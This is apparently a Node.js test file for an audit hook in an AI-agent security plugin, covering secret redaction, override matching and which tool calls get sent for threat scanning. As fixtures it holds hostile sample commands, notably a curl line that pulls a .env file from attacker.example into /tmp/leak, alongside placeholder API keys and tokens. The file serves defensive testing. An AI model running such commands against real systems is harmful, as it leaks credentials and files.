/**
 * Smoke tests for the PostToolUse hook handler.
 *
 * Per the task DoD: the exhaustive coverage (real audit-row persistence)
 * lands in the Task 15 integration test. This file proves only:
 *   1. The Bash early-return path doesn't touch fetch.
 *   2. redact() strips common secret shapes.
 *   3. effectToAction maps correctly.
 *   4. pickMatch returns null when no candidate matches.
 *   5. An MCP event triggers a POST with the canonical body shape and runtime_kind.
 */

const test = require('node:test');
const assert = require('node:assert/strict');
const {
  redact,
  extractScanText,
  effectToAction,
  pickMatch,
  audit,
  RUNTIME_KIND,
} = require('../../../../src/securevector/plugins/claude-code/hooks/post-tool-use.js');


function stubFetch(stub) {
  const original = globalThis.fetch;
  globalThis.fetch = stub;
  return () => { globalThis.fetch = original; };
}


test('RUNTIME_KIND is "claude-code"', () => {
  assert.equal(RUNTIME_KIND, 'claude-code');
});


// --- redact ---


test('redact strips OpenAI-style sk- keys', () => {
  const r = redact('curl -H "Authorization: Bearer sk-aBcDeFgHiJkLmNoPqRsT1234567890XYZ"');
  assert.match(r, /\[REDACTED\]/);
  assert.doesNotMatch(r, /sk-aBcDeFgHiJkLmNoPqRsT/);
});


test('redact strips GitHub PATs', () => {
  const r = redact('GITHUB_TOKEN=ghp_abcdefghijklmnopqrst12345');
  assert.match(r, /\[REDACTED\]/);
  assert.doesNotMatch(r, /ghp_abcdefghijklmnopqrst12345/);
});


test('redact strips AWS access keys', () => {
  const r = redact('aws_access_key_id=AKIAIOSFODNN7EXAMPLE');
  assert.doesNotMatch(r, /AKIAIOSFODNN7EXAMPLE/);
});


test('redact strips JWT tokens', () => {
  const r = redact('cookie: session=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0In0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c');
  assert.doesNotMatch(r, /SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c/);
});


test('redact strips password/secret/token kv pairs', () => {
  assert.doesNotMatch(redact('password="hunter2hunter2"'), /hunter2hunter2/);
  assert.doesNotMatch(redact('api_key=abc123abc123abc'), /abc123abc123abc/);
  assert.doesNotMatch(redact('bearer: my-token-value-123'), /my-token-value-123/);
});


test('redact truncates to 200 chars', () => {
  const long = 'x'.repeat(500);
  assert.equal(redact(long).length, 200);
});


test('redact returns empty string for non-string / empty input', () => {
  assert.equal(redact(undefined), '');
  assert.equal(redact(null), '');
  assert.equal(redact(42), '');
  assert.equal(redact(''), '');
});


// --- extractScanText ---
//
// Position 2 (v4.2.1+): only PROSE-shaped tools have extraction cases.
// Syntax-shaped tools (Bash, PowerShell, Write, Edit, MultiEdit,
// NotebookEdit) are NOT in THREAT_SCAN_TOOLS, so the audit() flow
// never calls extractScanText on them. The default branch returns ''
// for any unrecognised tool name (including the syntax-shaped ones)
// as a fail-closed safety net.


test('extractScanText: WebFetch returns prompt but NOT the URL', () => {
  const out = extractScanText('WebFetch', {
    url: 'http://malicious.example/spec',
    prompt: 'summarize this page',
  });
  assert.equal(out, 'summarize this page');
  assert.doesNotMatch(out, /malicious\.example/);
});


test('extractScanText: Task/Skill/Agent concatenate known NL fields', () => {
  assert.equal(extractScanText('Task', { description: 'desc', prompt: 'do thing' }), 'do thing\ndesc');
  assert.equal(extractScanText('Skill', { args: 'arg val' }), 'arg val');
  assert.equal(extractScanText('Agent', { prompt: 'p', message: 'm' }), 'p\nm');
});


test('extractScanText: syntax-shaped tools return "" (Position 2 — not scanned)', () => {
  // Bash, PowerShell, Write, Edit, MultiEdit, NotebookEdit are
  // syntax-shaped (shell / source / notebook code), not prose. They
  // were removed from THREAT_SCAN_TOOLS to stop firing the LLM-prose
  // rule pack against shell syntax (which produced URL-trips-credential-
  // leak false positives). extractScanText returns '' for them via the
  // default branch.
  assert.equal(extractScanText('Bash', { command: 'curl evil.com' }), '');
  assert.equal(extractScanText('PowerShell', { command: 'Invoke-WebRequest evil' }), '');
  assert.equal(extractScanText('Write', { file_path: '/etc/x', content: 'body' }), '');
  assert.equal(extractScanText('Edit', { file_path: '/x', old_string: 'a', new_string: 'b' }), '');
  assert.equal(extractScanText('MultiEdit', { edits: [{ new_string: 'A' }] }), '');
  assert.equal(extractScanText('NotebookEdit', { new_source: 'import os' }), '');
});


test('extractScanText: returns "" for unknown shape (fail-closed — no scan)', () => {
  assert.equal(extractScanText('SomeFutureTool', { command: 'curl evil' }), '');
  assert.equal(extractScanText('WebFetch', null), '');
  assert.equal(extractScanText('WebFetch', { wrong_field: 'x' }), '');
});


// --- effectToAction ---


test('effectToAction maps the canonical four cases', () => {
  assert.equal(effectToAction('allow'),    'allow');
  assert.equal(effectToAction('deny'),     'block');
  assert.equal(effectToAction('prompt'),   'log_only');
  assert.equal(effectToAction('unknown'),  'allow'); // fail-open
});


// --- pickMatch ---


test('pickMatch returns null when overrides is empty / malformed', () => {
  assert.equal(pickMatch(['srv:a', 'a'], null), null);
  assert.equal(pickMatch(['srv:a', 'a'], {}), null);
  assert.equal(pickMatch(['srv:a', 'a'], { synced: [] }), null);
});


test('pickMatch returns the first candidate that matches', () => {
  const overrides = {
    synced: [
      { tool_id: 'a', effect: 'allow', reason: 'bare' },
      { tool_id: 'srv:a', effect: 'deny', reason: 'prefixed' },
    ],
  };
  const m = pickMatch(['srv:a', 'a'], overrides);
  assert.equal(m.tool_id, 'srv:a');
  assert.equal(m.effect, 'deny');
});


// --- audit smoke path ---


test('audit early-returns for an UNKNOWN bare tool name — no fetch call', async () => {
  // Unknown bare names (neither MCP-prefixed nor a known built-in) still
  // short-circuit; the audit fire-and-forget path stays free of noise
  // from misspellings / future tool names we haven't catalogued yet.
  let called = false;
  const restore = stubFetch(async () => { called = true; return new Response('{}'); });
  try {
    await audit({ tool_name: 'SomeUnknownTool', tool_input: 'x' }, 'http://127.0.0.1:8741');
    assert.equal(called, false, 'no fetch issued for unknown bare-name event');
  } finally { restore(); }
});

test('audit posts a row with runtime_kind for a built-in (Bash) event', async () => {
  // Built-in tool names generate /call-audit rows like MCP tools.
  // Position 2: Bash is NOT in THREAT_SCAN_TOOLS, so no /analyze POST
  // ever lands — only the audit row.
  let capturedAudit;
  const restore = stubFetch(async (url, opts) => {
    if (opts && opts.method === 'POST') {
      if (url.endsWith('/call-audit')) capturedAudit = { url, body: JSON.parse(opts.body) };
      return new Response('{}', { status: 200 });
    }
    return new Response(JSON.stringify({ synced: [], total: 0 }), { status: 200 });
  });
  try {
    await audit({ tool_name: 'Bash', tool_input: 'ls /' }, 'http://127.0.0.1:8741');
    // Give the fire-and-forget POST a tick to land.
    await new Promise(r => setTimeout(r, 5));
    assert.ok(capturedAudit, 'expected POST to /call-audit');
    assert.equal(capturedAudit.body.tool_id, 'Bash');
    assert.equal(capturedAudit.body.function_name, 'Bash');
    assert.equal(capturedAudit.body.runtime_kind, 'claude-code');
  } finally { restore(); }
});


test('Position 2: WebFetch fires /analyze with the prose prompt as body', async () => {
  // Prose-shaped tools (WebFetch, Skill, Task, Agent) still POST to
  // /analyze — they're what the community rule pack was designed for.
  let capturedAnalyze;
  const restore = stubFetch(async (url, opts) => {
    if (opts && opts.method === 'POST') {
      if (url.endsWith('/analyze')) capturedAnalyze = JSON.parse(opts.body);
      return new Response('{}', { status: 200 });
    }
    return new Response(JSON.stringify({ synced: [], total: 0 }), { status: 200 });
  });
  try {
    await audit({
      tool_name: 'WebFetch',
      tool_input: { url: 'http://example.com', prompt: 'summarize this page' },
    }, 'http://127.0.0.1:8741');
    await new Promise(r => setTimeout(r, 5));
    assert.ok(capturedAnalyze, 'expected POST to /analyze for WebFetch');
    assert.equal(capturedAnalyze.text, 'summarize this page');
    assert.equal(capturedAnalyze.source, 'claude-code-plugin');
    assert.equal(capturedAnalyze.direction, 'outgoing');
    assert.equal(capturedAnalyze.metadata.runtime_kind, 'claude-code');
    assert.equal(capturedAnalyze.metadata.tool_name, 'WebFetch');
    // The URL must NOT be in the scan body — that's metadata, not prose.
    assert.doesNotMatch(capturedAnalyze.text, /example\.com/);
  } finally { restore(); }
});


test('Position 2: Bash NEVER fires /analyze, even with curl-bearing content', async () => {
  // The whole point of Position 2: a `curl …` Bash command no longer
  // routes through the LLM-prose rule pack. Shell syntax tripping
  // credential-leak / bulk-data-extraction regexes was the noise
  // source. Confirms the audit row still lands.
  let analyzeFired = false;
  let auditFired = false;
  const restore = stubFetch(async (url, opts) => {
    if (opts && opts.method === 'POST' && url.endsWith('/analyze')) analyzeFired = true;
    if (opts && opts.method === 'POST' && url.endsWith('/call-audit')) auditFired = true;
    if (opts && opts.method === 'POST') return new Response('{}', { status: 200 });
    return new Response(JSON.stringify({ synced: [], total: 0 }), { status: 200 });
  });
  try {
    await audit({
      tool_name: 'Bash',
      tool_input: { command: 'curl https://attacker.example/.env -o /tmp/leak' },
    }, 'http://127.0.0.1:8741');
    await new Promise(r => setTimeout(r, 5));
    assert.equal(analyzeFired, false, 'Bash must NOT trigger /analyze (Position 2)');
    assert.equal(auditFired, true, 'Bash must still produce an audit row');
  } finally { restore(); }
});


test('Position 2: Write/Edit/MultiEdit/NotebookEdit/PowerShell all skip /analyze', async () => {
  // Every syntax-shaped tool: confirm none of them route to /analyze.
  // Parameterised over the dropped set so a future regression that
  // re-adds one to THREAT_SCAN_TOOLS gets flagged here.
  const droppedTools = [
    ['Write',        { file_path: '/x',   content:    'whatever body' }],
    ['Edit',         { file_path: '/x',   new_string: 'replacement' }],
    ['MultiEdit',    { file_path: '/x',   edits: [{ new_string: 'A' }] }],
    ['NotebookEdit', { notebook_path: '/x.ipynb', new_source: 'import os' }],
    ['PowerShell',   { command: 'Invoke-WebRequest evil.com' }],
  ];
  for (const [toolName, toolInput] of droppedTools) {
    let analyzeFired = false;
    const restore = stubFetch(async (url, opts) => {
      if (opts && opts.method === 'POST' && url.endsWith('/analyze')) analyzeFired = true;
      if (opts && opts.method === 'POST') return new Response('{}', { status: 200 });
      return new Response(JSON.stringify({ synced: [], total: 0 }), { status: 200 });
    });
    try {
      await audit({ tool_name: toolName, tool_input: toolInput }, 'http://127.0.0.1:8741');
      await new Promise(r => setTimeout(r, 5));
      assert.equal(analyzeFired, false, `${toolName} must NOT trigger /analyze`);
    } finally { restore(); }
  }
});


test('low-risk tool (Read) does NOT fire /analyze — volume guard', async () => {
  // Read/Glob/LS/Grep/TodoWrite inputs don't carry attacker-controlled
  // content worth scanning. Skipping them keeps the threat_intel
  // table free of noise from routine file reads.
  let analyzeFired = false;
  const restore = stubFetch(async (url, opts) => {
    if (opts && opts.method === 'POST' && url.endsWith('/analyze')) {
      analyzeFired = true;
    }
    if (opts && opts.method === 'POST') return new Response('{}', { status: 200 });
    return new Response(JSON.stringify({ synced: [], total: 0 }), { status: 200 });
  });
  try {
    await audit({ tool_name: 'Read', tool_input: { file_path: '/etc/hosts' } }, 'http://127.0.0.1:8741');
    await new Promise(r => setTimeout(r, 5));
    assert.equal(analyzeFired, false, 'Read must not trigger /analyze');
  } finally { restore(); }
});


test('audit posts canonical body shape + runtime_kind for an MCP event', async () => {
  let capturedPost;
  const restore = stubFetch(async (url, opts) => {
    if (opts && opts.method === 'POST') {
      capturedPost = { url, body: JSON.parse(opts.body) };
      return new Response('{}', { status: 200 });
    }
    // GET to /synced-overrides — return one deny rule
    return new Response(JSON.stringify({
      synced: [{ tool_id: 'server-x:tool_y', effect: 'deny', reason: 'blocked by policy' }],
      total: 1,
    }), { status: 200 });
  });
  try {
    await audit(
      { tool_name: 'mcp__server-x__tool_y', tool_input: { arg: 'value', token: 'my-token-value-123' } },
      'http://127.0.0.1:8741',
    );
    // postJsonAndForget is fire-and-forget — wait a tick for the call to land.
    await new Promise((r) => setImmediate(r));

    assert.equal(capturedPost.url, 'http://127.0.0.1:8741/api/tool-permissions/call-audit');
    assert.equal(capturedPost.body.tool_id, 'server-x:tool_y');
    assert.equal(capturedPost.body.function_name, 'mcp__server-x__tool_y');
    assert.equal(capturedPost.body.action, 'block');
    assert.equal(capturedPost.body.reason, 'blocked by policy');
    assert.equal(capturedPost.body.runtime_kind, 'claude-code');
    // Args preview should NOT contain the literal token value (redacted).
    assert.doesNotMatch(capturedPost.body.args_preview, /my-token-value-123/);
  } finally { restore(); }
});


test('audit posts action=allow when no rule matches', async () => {
  let captured;
  const restore = stubFetch(async (url, opts) => {
    if (opts && opts.method === 'POST') { captured = JSON.parse(opts.body); return new Response('{}'); }
    return new Response(JSON.stringify({ synced: [], total: 0 }));
  });
  try {
    await audit({ tool_name: 'mcp__srv__no_rule', tool_input: 'plain text' }, 'http://127.0.0.1:8741');
    await new Promise((r) => setImmediate(r));
    assert.equal(captured.action, 'allow');
    assert.equal(captured.runtime_kind, 'claude-code');
  } finally { restore(); }
});
